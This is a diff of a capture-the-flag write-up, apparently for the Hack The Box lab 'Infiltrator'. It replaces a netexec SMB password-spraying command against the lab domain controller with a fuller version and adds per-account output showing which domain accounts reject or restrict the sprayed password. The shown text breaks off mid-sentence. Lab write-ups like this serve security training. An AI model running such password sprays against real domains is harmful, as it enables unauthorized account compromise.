@@ -267,8 +267,22 @@ Found another password
 There is no lockout policy on the domain
 
 ```python
-nxc smb dc01.infiltrator.htb -u AD-users.txt -p 'MessengerApp@Pass!' --continue-on-success
-
-SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\d.anderson:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
-
+nxc smb dc01.infiltrator.htb -u users.txt -p 'MessengerApp@Pass!' --continue-on-success
+SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\Administrator:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\Guest:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\krbtgt:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\DC01$:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\D.anderson:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\L.clark:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\M.harris:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\O.martinez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\A.walker:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\K.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\E.rodriguez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\winrm_svc:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\infiltrator_svc$:MessengerApp@Pass! STATUS_LOGON_FAILURE 
+SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\lan_managment:MessengerApp@Pass! STATUS_LOGON_FAILURE
 ```
+
+Two users are shows to have a sa
